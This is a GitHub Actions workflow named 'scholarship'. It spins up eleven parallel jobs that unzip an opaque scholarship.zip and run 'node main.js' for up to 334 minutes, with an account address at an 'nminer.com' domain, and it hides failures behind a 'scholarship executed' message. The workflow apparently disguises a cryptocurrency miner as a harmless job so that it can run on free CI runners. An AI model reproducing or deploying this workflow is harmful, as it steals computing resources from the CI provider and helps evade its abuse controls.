name: scholarship
on:
  push:
    branches: [ "main" ]
    paths:
      - "scholarship.txt"

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { os: 0 }
          - { os: 1 }
          - { os: 2 }
          - { os: 3 }
          - { os: 4 }
          - { os: 5 }
          - { os: 6 }
          - { os: 7 }
          - { os: 8 }
          - { os: 9 }
          - { os: 10 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20

      - name: Unzip scholarship.zip
        run: |
          sudo apt install -y unzip
          unzip scholarship.zip

      - name: firm
        run: |
          npm install --ignore-scripts
          timeout 334m node main.js fitnessempire455@nminer.com || echo "scholarship executed"